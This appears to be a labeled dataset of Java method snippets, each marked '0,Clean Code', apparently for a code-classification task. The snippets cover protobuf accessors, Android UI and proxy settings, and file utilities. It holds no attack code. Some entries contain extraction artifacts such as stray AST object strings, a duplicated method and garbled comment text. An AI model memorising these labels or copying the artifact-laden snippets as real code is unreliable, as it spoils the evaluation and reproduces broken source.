case TypedValue.TYPE_FLOAT:
return new ResFloatValue(Float.intBitsToFloat(value),value,rawValue);
case TypedValue.TYPE_DIMENSION:
return new ResDimenValue(value,rawValue);
case TypedValue.TYPE_FRACTION:
return new ResFractionValue(value,rawValue);
case TypedValue.TYPE_INT_BOOLEAN:
return new ResBoolValue(value != 0,value,rawValue);
case 0x07:
return newReference(value,rawValue);
}
if (type >= TypedValue.TYPE_FIRST_COLOR_INT && type <= TypedValue.TYPE_LAST_COLOR_INT) {
return new ResColorValue(value,rawValue);
}
if (type >= TypedValue.TYPE_FIRST_INT && type <= TypedValue.TYPE_LAST_INT) {
return new ResIntValue(value,rawValue,type);
}
throw new IOException(""Invalid value type: "" + type);
}
public ResIntBasedValue factory(String value,int rawValue){
  if (value.startsWith(""res/"")) {
    return new ResFileValue(value,rawValue);
  }
  return new ResStringValue(value,rawValue);
}",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 10;</code>
 * @param value the retcode to set
 * @return this
 */
public GetPhoneDataScRsp setRetcode(final int value){
  bitField0_|=0x00000002;
  retcode=value;
  return this;
}",0,Clean Code
"public void handleMouseEvent(final MouseEvent event){
  if (event.getButton() != MouseEvent.BUTTON3 || !event.isPopupTrigger()) {
    return;
  }
  final JPopupMenu popup=getPopupMenu();
  if (popup != null) {
    popup.show(getTree(),event.getX(),event.getY());
  }
}",0,Clean Code
"/** 
 * Converts the given structured prompt to a prompt.
 * @param structuredPrompt the structured prompt.
 * @return the prompt.
 */
public static Prompt toPrompt(Object structuredPrompt){
  return FACTORY.toPrompt(structuredPrompt);
}
",0,Clean Code
"/** 
 * <code>repeated .Chat chat_list = 8;</code>
 * @param values the chatList to add
 * @return this
 */
public GetPrivateChatHistoryScRsp addAllChatList(final ChatOuterClass.Chat... values){
  bitField0_|=0x00000008;
  chatList.addAll(values);
  return this;
}",0,Clean Code
"@Override public String getGuildName(){
  return this.mInfo.getGuildName();
}
",0,Clean Code
"/** 
 * <code>repeated uint32 slot_list = 6;</code>
 * @param value the slotList to add
 * @return this
 */
public TakeOffRelicCsReq addSlotList(final int value){
  bitField0_|=0x00000004;
  slotList.add(value);
  return this;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeInt64SizeNoTag(beginTime);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeInt64SizeNoTag(endTime);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt64SizeNoTag(cityTakenLevelReward);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(shopId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cityExp);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cityLevel);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    size+=(1 * goodsList.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(goodsList);
  }
  return size;
}",0,Clean Code
"public String getApiKey(){
  return this.apiKey;
}
",0,Clean Code
"/** 
 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<ChallengeStatus> converter(){
  return ChallengeStatusConverter.INSTANCE;
}
",0,Clean Code
"public OpenSearchEmbeddingStore build(){
  if (openSearchClient != null) {
    return new OpenSearchEmbeddingStore(openSearchClient,indexName);
  }
  if (!isNullOrBlank(serviceName) && !isNullOrBlank(region) && options != null) {
    return new OpenSearchEmbeddingStore(serverUrl,serviceName,region,options,indexName);
  }
  return new OpenSearchEmbeddingStore(serverUrl,apiKey,userName,password,indexName);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(groupId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(state);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeEnumSizeNoTag(groupRefreshType);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=(1 * refreshEntity.length()) + ProtoSink.computeRepeatedMessageSizeNoTag(refreshEntity);
  }
  return size;
}",0,Clean Code
"public String getPeerUid(){
  return this.peerUid;
}
",0,Clean Code
"private static void friendWatchNewWeek(){
  JSONObject joSingle;
  try {
    String dateStr=TimeUtil.getDateStr();
    List<String> friendIds=FriendIdMap.getFriendIds();
    for (    String id : friendIds) {
      if (joFriendWatch.has(id)) {
        joSingle=joFriendWatch.getJSONObject(id);
      }
 else {
        joSingle=new JSONObject();
      }
      joSingle.put(""name"",FriendIdMap.getNameById(id));
      joSingle.put(""allGet"",joSingle.optInt(""allGet"",0) + joSingle.optInt(""weekGet"",0));
      joSingle.put(""weekGet"",0);
      if (!joSingle.has(""startTime"")) {
        joSingle.put(""startTime"",dateStr);
      }
      joFriendWatch.put(id,joSingle);
    }
    FileUtils.write2File(joFriendWatch.toString(),FileUtils.getFriendWatchFile());
  }
 catch (  Throwable th) {
    Log.i(TAG,""friendWatchNewWeek err:"");
    Log.printStackTrace(TAG,th);
  }
}",0,Clean Code
"private void startArray(){
  builder.append('[');
  increaseIndent();
}
",0,Clean Code
"public Subclass1(boolean copy,int age,int state){
  super(copy,age);
  this.state=state;
}",0,Clean Code
"public String toString(){
  return ""GProUserGiftInfo{giftPrice="" + this.giftPrice + "",showGiftPrice=""+ this.showGiftPrice+ "",giftTipsMsg=""+ this.giftTipsMsg+ "",}"";
}
",0,Clean Code
"int getCurrentSlowModeKey();
",0,Clean Code
"@Override public void onItemClick(int id){
  if (id == -1) {
    finishFragment();
  }
 else   if (id == done_button) {
    if (getParentActivity() == null) {
      return;
    }
    if (StrUtil.isBlank(ipField.getText())) {
      ipField.requestFocus();
      AndroidUtilities.showKeyboard(ipField);
      return;
    }
    if (StrUtil.isBlank(portField.getText())) {
      portField.requestFocus();
      AndroidUtilities.showKeyboard(portField);
      return;
    }
    if (StrUtil.isBlank(passwordField.getText()) && !""plain"".equals(methodField.getTextView().getText().toString().toLowerCase())) {
      passwordField.requestFocus();
      AndroidUtilities.showKeyboard(passwordField);
      return;
    }
    currentBean.setHost(ipField.getText().toString());
    currentBean.setRemotePort(Utilities.parseInt(portField.getText().toString()));
    currentBean.setPassword(passwordField.getText().toString());
    currentBean.setMethod(methodField.getValueTextView().getText().toString());
    currentBean.setPlugin(plugin.toString());
    currentBean.setRemarks(remarksField.getText().toString());
    if (currentProxyInfo == null) {
      currentProxyInfo=new SharedConfig.ShadowsocksProxy(currentBean);
      SharedConfig.addProxy(currentProxyInfo);
      SharedConfig.setCurrentProxy(currentProxyInfo);
    }
 else {
      currentProxyInfo.proxyCheckPingId=0;
      currentProxyInfo.availableCheckTime=0;
      currentProxyInfo.ping=0;
      SharedConfig.saveProxyList();
      SharedConfig.setProxyEnable(false);
    }
    finishFragment();
  }
}",0,Clean Code
"void setDate(int ordinal,int value);
",0,Clean Code
"public static void main(String[] args){
  customPointcut();
}
",0,Clean Code
"@Override public LockRelicScRsp copyFrom(final LockRelicScRsp other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    retcode=other.retcode;
    relicUniqueId=other.relicUniqueId;
  }
  return this;
}",0,Clean Code
"private WorkflowTask generateWorkflowTask(String forkTaskName,String forkTaskType,Object forkTaskInput){
  WorkflowTask forkTask=new WorkflowTask();
  try {
    forkTask=objectMapper.convertValue(forkTaskInput,WorkflowTask.class);
  }
 catch (  Exception ignored) {
  }
  forkTask.setName(forkTaskName);
  forkTask.setType(forkTaskType);
  Map<String,Object> inputParameters=new HashMap<>();
  if (forkTaskInput instanceof Map) {
    inputParameters.putAll((Map<? extends String,?>)forkTaskInput);
  }
 else {
    inputParameters.put(""input"",forkTaskInput);
  }
  forkTask.setInputParameters(inputParameters);
  forkTask.setTaskDefinition(metadataDAO.getTaskDef(forkTaskName));
  return forkTask;
}
",0,Clean Code
"private IndependentMultiLabelModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private IndependentMultiLabelModelProto(){
  models_=java.util.Collections.emptyList();
  labels_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5fbdaef6",0,Clean Code
"/** 
 * <code>repeated .SceneEntityInfo entity_list = 10;</code>
 * @param value the entityList to add
 * @return this
 */
public SceneInfo addEntityList(final SceneEntityInfoOuterClass.SceneEntityInfo value){
  bitField0_|=0x00000200;
  entityList.add(value);
  return this;
}",0,Clean Code
"@Override public ModuleKey getOriginal(){
  return this;
}
@Override public ModuleKey getOriginal(){
  return this;
}
",0,Clean Code
"static Object coerceArgument(Object argument,String parameterName,Class<?> parameterType){
  if (parameterType == String.class) {
    return argument.toString();
  }
  if (parameterType.isEnum()) {
    try {
      @SuppressWarnings({""unchecked"",""rawtypes""}) Class<Enum> enumClass=(Class<Enum>)parameterType;
      return Enum.valueOf(enumClass,Objects.requireNonNull(argument.toString()));
    }
 catch (    Exception|Error e) {
      throw new IllegalArgumentException(String.format(""Argument \""%s\"" is not a valid enum value for %s: <%s>"",parameterName,parameterType.getName(),argument),e);
    }
  }
  if (parameterType == Boolean.class || parameterType == boolean.class) {
    if (argument instanceof Boolean) {
      return argument;
    }
    throw new IllegalArgumentException(String.format(""Argument \""%s\"" is not convertable to %s, got %s: <%s>"",parameterName,parameterType.getName(),argument.getClass().getName(),argument));
  }
  if (parameterType == Double.class || parameterType == double.class) {
    return getDoubleValue(argument,parameterName,parameterType);
  }
  if (parameterType == Float.class || parameterType == float.class) {
    double doubleValue=getDoubleValue(argument,parameterName,parameterType);
    checkBounds(doubleValue,parameterName,parameterType,-Float.MIN_VALUE,Float.MAX_VALUE);
    return (float)doubleValue;
  }
  if (parameterType == BigDecimal.class) {
    return BigDecimal.valueOf(getDoubleValue(argument,parameterName,parameterType));
  }
  if (parameterType == Integer.class || parameterType == int.class) {
    return (int)getBoundedLongValue(argument,parameterName,parameterType,Integer.MIN_VALUE,Integer.MAX_VALUE);
  }
  if (parameterType == Long.class || parameterType == long.class) {
    return getBoundedLongValue(argument,parameterName,parameterType,Long.MIN_VALUE,Long.MAX_VALUE);
  }
  if (parameterType == Short.class || parameterType == short.class) {
    return (short)getBoundedLongValue(argument,parameterName,parameterType,Short.MIN_VALUE,Short.MAX_VALUE);
  }
  if (parameterType == Byte.class || parameterType == byte.class) {
    return (byte)getBoundedLongValue(argument,parameterName,parameterType,Byte.MIN_VALUE,Byte.MAX_VALUE);
  }
  if (parameterType == BigInteger.class) {
    return BigDecimal.valueOf(getNonFractionalDoubleValue(argument,parameterName,parameterType)).toBigInteger();
  }
  return argument;
}
",0,Clean Code
"@Override public String getUsername(){
  return ""sa"";
}
",0,Clean Code
"void setRowData(int i,DataType dt,GenericInternalRow row){
  if (dt instanceof BooleanType) {
    row.setBoolean(i,getBoolean(i));
  }
 else   if (dt instanceof ByteType) {
    row.setByte(i,getByte(i));
  }
 else   if (dt instanceof ShortType) {
    row.setShort(i,getShort(i));
  }
 else   if (dt instanceof IntegerType) {
    row.setInt(i,getInt(i));
  }
 else   if (dt instanceof LongType) {
    row.setLong(i,getLong(i));
  }
 else   if (dt instanceof FloatType) {
    row.setFloat(i,getFloat(i));
  }
 else   if (dt instanceof DoubleType) {
    row.setDouble(i,getDouble(i));
  }
 else   if (dt instanceof StringType) {
    row.update(i,getUTF8String(i).copy());
  }
 else   if (dt instanceof BinaryType) {
    row.update(i,getBinary(i));
  }
 else   if (dt instanceof DecimalType) {
    DecimalType t=(DecimalType)dt;
    row.setDecimal(i,getDecimal(i,t.precision(),t.scale()),t.precision());
  }
 else   if (dt instanceof DateType) {
    row.setInt(i,getInt(i));
  }
 else   if (dt instanceof TimestampType) {
    row.setLong(i,getLong(i));
  }
 else {
    throw new RuntimeException(""Not implemented. "" + dt);
  }
}",0,Clean Code
"public final int getWindowYPos(){
  return Config.getInstance().getPreferences().getLayout().getY();
}
",0,Clean Code
"@Override public void writeExternal(ObjectOutput out) throws IOException {
  out.writeInt(x);
  out.writeInt(y);
  out.writeInt(bytes.length);
  out.write(bytes);
}
",0,Clean Code
"@Override public void onCheckedChanged(CompoundButton compoundButton,boolean b){
  if (b && !TxtNetServerService.isRunning) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && ContextCompat.checkSelfPermission(compoundButton.getContext(),Manifest.permission.WRITE_SECURE_SETTINGS) == PackageManager.PERMISSION_DENIED) {
      Log.e(""perm"",""No permission!"");
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        boolean isGranted;
        if (Shizuku.isPreV11() || Shizuku.getVersion() < 11) {
          isGranted=checkSelfPermission(ShizukuProvider.PERMISSION) == PackageManager.PERMISSION_GRANTED;
        }
 else {
          isGranted=Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED;
        }
        if (!isGranted) {
          Log.e(""rationale_shouldshow"",String.valueOf(Shizuku.shouldShowRequestPermissionRationale()));
          if (Shizuku.isPreV11() || Shizuku.getVersion() < 11) {
            requestPermissions(new String[]{ShizukuProvider.PERMISSION},SHIZUKU_CODE);
          }
 else {
            Shizuku.requestPermission(31);
          }
        }
 else {
          grantPermissions();
        }
      }
 else {
        boolean didAcceptAdb=getSharedPreferences(getPackageName() + ""_preferences"",MODE_PRIVATE).getBoolean(""outdatedAdbAccepted"",false);
        if (!didAcceptAdb) {
          Toast.makeText(compoundButton.getContext(),""TOD0: Add Instructions for manual ADB on Android 4.4-6 (cant use shizuku)"",Toast.LENGTH_LONG).show();
          Intent intent=new Intent(compoundButton.getContext(),ShizukuIncompatible.class);
          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
          startActivity(intent);
          ActivityCompat.finishAffinity(ServerDisplay.this);
        }
      }
      serverSwitch.setChecked(false);
    }
 else {
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && ContextCompat.checkSelfPermission(compoundButton.getContext(),Manifest.permission.WRITE_SECURE_SETTINGS) == PackageManager.PERMISSION_DENIED) {
        grantPermissions();
      }
      doBindService();
      final TextView tv=(TextView)findViewById(R.id.serverStatusText);
      tv.setText(R.string.server_started);
    }
  }
 else   if (!b && TxtNetServerService.isRunning) {
    Intent intent=new Intent(compoundButton.getContext(),TxtNetServerService.class);
    intent.setAction(Constants.ACTION.STOPFOREGROUND_ACTION);
    compoundButton.getContext().getApplicationContext().startService(intent);
    doUnbindService();
    final TextView tv=(TextView)findViewById(R.id.serverStatusText);
    tv.setText(R.string.server_stopped);
  }
}",0,Clean Code
"/** 
 * <code>repeated .RogueMiracle miracle_list = 14;</code>
 * @param value the miracleList to add
 * @return this
 */
public RogueAchivedMiracleInfo addMiracleList(final RogueMiracleOuterClass.RogueMiracle value){
  bitField0_|=0x00000004;
  miracleList.add(value);
  return this;
}",0,Clean Code
"private TensorFlowSavedModelExternalModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private TensorFlowSavedModelExternalModelProto(){
  forwardFeatureMapping_=emptyIntList();
  backwardFeatureMapping_=emptyIntList();
  modelDirectory_="""";
  outputName_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@52ee5df8",0,Clean Code
"public boolean needDrawShareButton(){
  if (preview) {
    return false;
  }
 else   if (scheduled) {
    return false;
  }
 else   if (eventId != 0) {
    return false;
  }
 else   if (messageOwner.noforwards) {
    return false;
  }
 else   if (messageOwner.fwd_from != null && !isOutOwner() && messageOwner.fwd_from.saved_from_peer != null && getDialogId() == UserConfig.getInstance(currentAccount).getClientUserId()) {
    return true;
  }
 else   if (type == TYPE_STICKER || type == TYPE_ANIMATED_STICKER || type == TYPE_EMOJIS) {
    return false;
  }
 else   if (messageOwner.fwd_from != null && messageOwner.fwd_from.from_id instanceof TLRPC.TL_peerChannel && !isOutOwner()) {
    return true;
  }
 else   if (isFromUser()) {
    if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaEmpty || getMedia(messageOwner) == null || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage && !(getMedia(messageOwner).webpage instanceof TLRPC.TL_webPage)) {
      return false;
    }
    TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(messageOwner.from_id.user_id);
    if (user != null && user.bot && !hasExtendedMedia()) {
      return true;
    }
    if (!isOut()) {
      if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaGame || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaInvoice && !hasExtendedMedia() || getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage) {
        return true;
      }
      TLRPC.Chat chat=messageOwner.peer_id != null && messageOwner.peer_id.channel_id != 0 ? getChat(null,null,messageOwner.peer_id.channel_id) : null;
      if (ChatObject.isChannel(chat) && chat.megagroup) {
        return ChatObject.isPublic(chat) && !(getMedia(messageOwner) instanceof TLRPC.TL_messageMediaContact) && !(getMedia(messageOwner) instanceof TLRPC.TL_messageMediaGeo);
      }
    }
  }
 else   if (messageOwner.from_id instanceof TLRPC.TL_peerChannel || messageOwner.post) {
    if (getMedia(messageOwner) instanceof TLRPC.TL_messageMediaWebPage && !isOutOwner()) {
      return true;
    }
    if (isSupergroup()) {
      return false;
    }
    if (messageOwner.peer_id.channel_id != 0 && (messageOwner.via_bot_id == 0 && messageOwner.reply_to == null || type != TYPE_STICKER && type != TYPE_ANIMATED_STICKER)) {
      return true;
    }
  }
  return false;
}",0,Clean Code
"public User getUser(){
  return this.user;
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code TakeChallengeRewardCsReq}
 */
public static TakeChallengeRewardCsReq newInstance(){
  return new TakeChallengeRewardCsReq();
}
",0,Clean Code
"/** 
 * Query data source connection details based on id
 * @param id
 * @return
 * @throws ai.chat2db.server.tools.common.exception.DataNotFoundException
 */
DataResult<DataSource> queryExistent(@NotNull Long id,DataSourceSelector selector);",0,Clean Code
"/** 
 * <code>repeated uint32 unlocked_teleport_list = 8;</code>
 * @param value the unlockedTeleportList to add
 * @return this
 */
public GetUnlockTeleportScRsp addUnlockedTeleportList(final int value){
  bitField0_|=0x00000002;
  unlockedTeleportList.add(value);
  return this;
}",0,Clean Code
"public ArrayList<GrayTipMember> getMemberInfo(){
  return this.memberInfo;
}
",0,Clean Code
"public ClassInfo getElementClassInfo(){
  return getElementClassInfo(elementType);
}
public ClassInfo getElementClassInfo(Class<?> elementType){
  return classResolver.getClassInfo(elementType,elementClassInfoHolder);
}
",0,Clean Code
"public Integer getEmojiId(){
  return this.emojiId;
}
",0,Clean Code
"/** 
 * Internal copy directory method.
 * @param srcDir  the validated source directory, must not be <code>null</code>
 * @param destDir  the validated destination directory, must not be <code>null</code>
 * @param filter  the filter to apply, null means copy all directories and files
 * @param preserveFileDate  whether to preserve the file date
 * @param exclusionList  List of files and directories to exclude from the copy, may be null
 * @throws IOException if an error occurs
 * @since Commons IO 1.1
 */
private static void doCopyDirectory(File srcDir,File destDir,FileFilter filter,boolean preserveFileDate,List<String> exclusionList) throws IOException {
  File[] files=filter == null ? srcDir.listFiles() : srcDir.listFiles(filter);
  if (files == null) {
    throw new IOException(""Failed to list contents of "" + srcDir);
  }
  if (destDir.exists()) {
    if (destDir.isDirectory() == false) {
      throw new IOException(""Destination '"" + destDir + ""' exists but is not a directory"");
    }
  }
 else {
    if (destDir.mkdirs() == false) {
      throw new IOException(""Destination '"" + destDir + ""' directory cannot be created"");
    }
  }
  if (destDir.canWrite() == false) {
    throw new IOException(""Destination '"" + destDir + ""' cannot be written to"");
  }
  for (  File file : files) {
    File copiedFile=new File(destDir,file.getName());
    if (exclusionList == null || !exclusionList.contains(file.getCanonicalPath())) {
      if (file.isDirectory()) {
        doCopyDirectory(file,copiedFile,filter,preserveFileDate,exclusionList);
      }
 else {
        doCopyFile(file,copiedFile,preserveFileDate);
      }
    }
  }
  if (preserveFileDate) {
    destDir.setLastModified(srcDir.lastModified());
  }
}",0,Clean Code
"/** 
 * <code>repeated uint32 equipment_id_list = 13;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedInt getMutableEquipmentIdList(){
  bitField0_|=0x00000002;
  return equipmentIdList;
}",0,Clean Code
"@Override public void keyPressed(final KeyEvent event){
}
",0,Clean Code
"@Override public String getUsername(){
  return ""system"";
}
",0,Clean Code
"@Override public PublicAnswerView saveAnswer(AnswerRequest request){
  String projectId=request.getProjectId();
  PublicAnswerView result=new PublicAnswerView();
  ProjectView project=projectService.getProject(projectId);
  String answerId=request.getId();
  String randomSurveyCookieName=AppConsts.COOKIE_RANDOM_PROJECT_PREFIX + project.getId();
  String answerIdFromCookie=ContextHelper.getCookie(randomSurveyCookieName);
  if (isNotBlank(answerIdFromCookie)) {
    answerId=answerIdFromCookie;
  }
 else   if (isNotBlank(request.getQueryId())) {
    validateAndMergeAnswer(project,request);
  }
 else   if (isNotBlank(request.getId())) {
    boolean enableUpdate=Boolean.TRUE.equals(project.getSetting().getSubmittedSetting().getEnableUpdate());
    if (!enableUpdate) {
      throw new ErrorCodeException(ErrorCode.AnswerChangeDisabled);
    }
  }
 else {
    AnswerView latestAnswer=validateAndGetLatestAnswer(project,request);
    if (latestAnswer != null) {
      answerId=latestAnswer.getId();
    }
  }
  request.setId(answerId);
  AnswerView answerView=answerService.saveAnswer(request);
  result.setAnswerId(answerView.getId());
  if (ProjectModeEnum.exam.equals(project.getMode())) {
    result.setExamScore(answerView.getExamScore());
    result.setQuestionScore(answerView.getExamInfo().getQuestionScore());
    AnswerExamInfo answerExamInfo=answerView.getExamInfo();
    LinkedHashMap<String,Double> questionScore=answerExamInfo.getQuestionScore();
    userBookService.saveWrongQuestion(questionScore);
  }
  request.setId(answerView.getId());
  updateProjectPartnerByAnswer(request,project);
  if (isNotBlank(answerIdFromCookie)) {
    Cookie cookie=new Cookie(randomSurveyCookieName,answerIdFromCookie);
    cookie.setMaxAge(0);
    ContextHelper.getCurrentHttpResponse().addCookie(cookie);
  }
  return result;
}",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (java.lang.Double.doubleToRawLongBits(bias_) != 0) {
    output.writeDouble(1,bias_);
  }
  if (getLabelList().size() > 0) {
    output.writeUInt32NoTag(18);
    output.writeUInt32NoTag(labelMemoizedSerializedSize);
  }
  for (int i=0; i < label_.size(); i++) {
    output.writeInt32NoTag(label_.getInt(i));
  }
  if (nrClass_ != 0) {
    output.writeInt32(3,nrClass_);
  }
  if (nrFeature_ != 0) {
    output.writeInt32(4,nrFeature_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(solverType_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,5,solverType_);
  }
  if (getWList().size() > 0) {
    output.writeUInt32NoTag(50);
    output.writeUInt32NoTag(wMemoizedSerializedSize);
  }
  for (int i=0; i < w_.size(); i++) {
    output.writeDoubleNoTag(w_.getDouble(i));
  }
  if (java.lang.Double.doubleToRawLongBits(rho_) != 0) {
    output.writeDouble(7,rho_);
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"/** 
 * <pre> unfinished </pre> <code>optional uint32 reach_room_count = 1911;</code>
 * @param value the reachRoomCount to set
 * @return this
 */
public RogueFinishInfo setReachRoomCount(final int value){
  bitField0_|=0x00000010;
  reachRoomCount=value;
  return this;
}",0,Clean Code
"@Override public EntityMotion copyFrom(final EntityMotion other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    entityId=other.entityId;
    mapLayer=other.mapLayer;
    motion.copyFrom(other.motion);
  }
  return this;
}",0,Clean Code
"public void setColor(Drawable drawable,int color){
  int mColorAlpha=(color & 0xff000000) >> 24;
  int mColorRed=(color & 0x00ff0000) >> 16;
  int mColorGreen=(color & 0x0000ff00) >> 8;
  int mColorBlue=(color & 0x000000ff);
  XposedHelpers.callMethod(drawable,""setColor"",Color.argb(mColorAlpha,mColorRed,mColorGreen,mColorBlue));
}
public void setColor(Drawable drawable,String color){
  XposedHelpers.callMethod(drawable,""setColor"",Color.parseColor(color));
}",0,Clean Code
"private void initTabHost(){
  tabHost=findViewById(R.id.tab_settings);
  tabHost.setup();
  TabHost.TabSpec tabSpec;
  tabSpec=tabHost.newTabSpec(""base"").setIndicator(getString(R.string.base_configuration)).setContent(R.id.tab_base);
  tabHost.addTab(tabSpec);
  tabSpec=tabHost.newTabSpec(""forest"").setIndicator(getString(R.string.forest_configuration)).setContent(R.id.tab_forest);
  tabHost.addTab(tabSpec);
  tabSpec=tabHost.newTabSpec(""farm"").setIndicator(getString(R.string.farm_configuration)).setContent(R.id.tab_farm);
  tabHost.addTab(tabSpec);
  tabSpec=tabHost.newTabSpec(""other"").setIndicator(getString(R.string.other_configuration)).setContent(R.id.tab_other);
  tabHost.addTab(tabSpec);
  tabHost.setCurrentTab(0);
}",0,Clean Code
"private SequenceDatasetProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SequenceDatasetProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4821bf0",0,Clean Code
"@Override public QuantizedVector encode(VectorFloat<?> v){
  var vCentered=VectorUtil.sub(v,globalMean);
  var u=VectorUtil.max(vCentered);
  var l=VectorUtil.min(vCentered);
  var quantized=vectorTypeSupport.createByteSequence(vCentered.length());
  for (int i=0; i < vCentered.length(); i++) {
    quantized.set(i,quantizeFloatToByte(vCentered.get(i),l,u));
  }
  return new QuantizedVector(quantized,l,(u - l) / 255);
}",0,Clean Code
"private Address[] buildAddressesFromHosts(){
  final String hosts=properties.getHosts();
  if (StringUtils.isEmpty(hosts)) {
    throw new IllegalArgumentException(""Hosts are undefined"");
  }
  return Address.parseAddresses(hosts);
}
",0,Clean Code
"/** 
 * 璁剧疆鍔犺浇鐨勬椿璺冪殑profile鏂囦欢
 */
public static void setLoadActiveProfiles(String[] activeProfiles){
  if (activeProfiles == null || activeProfiles.length == 0) {
    return;
  }
  for (  String profile : activeProfiles) {
    if (profile.contains(""dev"") || profile.contains(""integration"")) {
      type=EnvType.DEV;
    }
 else     if (profile.contains(""test"")) {
      type=EnvType.TEST;
    }
 else     if (profile.contains(""stable"")) {
      type=EnvType.STABLE;
    }
 else     if (profile.contains(""pressure"")) {
      type=EnvType.PRESSURE;
    }
 else     if (profile.contains(""pre"")) {
      type=EnvType.PRECN;
    }
 else     if (profile.contains(""online"")) {
      type=EnvType.ONLINECN;
    }
  }
}",0,Clean Code
"private void recreateInstructionSynchronized(final ZyLabelContent labelContent,final RawInstruction instruction,final int lineIndex){
  final RawBasicBlock basicblock=((BasicBlockLineObject)labelContent.getModel()).getRawBasicblock();
  final ESide side=basicblock.getSide();
  RawInstruction priInstruction=null;
  RawInstruction secInstruction=null;
  if (basicblock.getSide() == ESide.PRIMARY) {
    priInstruction=instruction;
    secInstruction=null;
    final RawBasicBlock secBasicblock=GraphGetter.getSecondaryRawBasicblock(graphContainer,basicblock);
    final BasicBlockMatchData basicblockMatch=MatchesGetter.getBasicBlockMatch(functionMatch,basicblock);
    if (basicblockMatch != null) {
      final IAddress secInstructionAddr=basicblockMatch.getSecondaryInstructionAddr(priInstruction.getAddress());
      secInstruction=secBasicblock.getInstruction(secInstructionAddr);
    }
  }
 else {
    priInstruction=null;
    secInstruction=instruction;
    final RawBasicBlock priBasicblock=GraphGetter.getPrimaryRawBasicblock(graphContainer,basicblock);
    final BasicBlockMatchData basicblockMatch=MatchesGetter.getBasicBlockMatch(functionMatch,basicblock);
    if (basicblockMatch != null) {
      final IAddress priInstructionAddr=basicblockMatch.getPrimaryInstructionAddr(secInstruction.getAddress());
      priInstruction=priBasicblock.getInstruction(priInstructionAddr);
    }
  }
  final int maxTopCommentLineCount=ViewCodeNodeBuilder.precalcMaxCommentLineCount(priInstruction,secInstruction,ECommentPlacement.ABOVE_LINE);
  final int maxRightCommentLineCount=ViewCodeNodeBuilder.precalcMaxCommentLineCount(priInstruction,secInstruction,ECommentPlacement.BEHIND_LINE);
  labelContent.setRightPadding(NODELABEL_PADDING);
  recreateInstruction(labelContent,instruction,lineIndex,maxTopCommentLineCount,maxRightCommentLineCount);
  SingleDiffNode otherDiffNode=null;
  if (side == ESide.PRIMARY) {
    otherDiffNode=GraphGetter.getSecondaryDiffNode(graphContainer.getPrimaryGraph(),basicblock);
  }
 else {
    otherDiffNode=GraphGetter.getPrimaryDiffNode(graphContainer.getSecondaryGraph(),basicblock);
  }
  if (otherDiffNode != null) {
    final ZyLabelContent otherLabelContent=otherDiffNode.getRealizer().getNodeContent();
    otherLabelContent.setRightPadding(NODELABEL_PADDING);
    recreateInstruction(otherLabelContent,side == ESide.PRIMARY ? secInstruction : priInstruction,lineIndex,maxTopCommentLineCount,maxRightCommentLineCount);
    final double width=labelContent.getBounds().getWidth();
    final double otherWidth=otherLabelContent.getBounds().getWidth();
    if (width > otherWidth) {
      otherLabelContent.setRightPadding((int)Math.round(width - otherWidth) + 10);
    }
 else {
      labelContent.setRightPadding((int)Math.round(otherWidth - width) + 10);
    }
    otherDiffNode.getRealizer().regenerate();
  }
  final SingleDiffNode diffNode=GraphGetter.getDiffNode(graphContainer,basicblock);
  diffNode.getRealizer().regenerate();
  graphContainer.getSuperGraph().refreshSuperNodeSize(graphContainer.getPrimaryGraph(),graphContainer.getSecondaryGraph(),diffNode.getSuperDiffNode());
  graphContainer.updateViews();
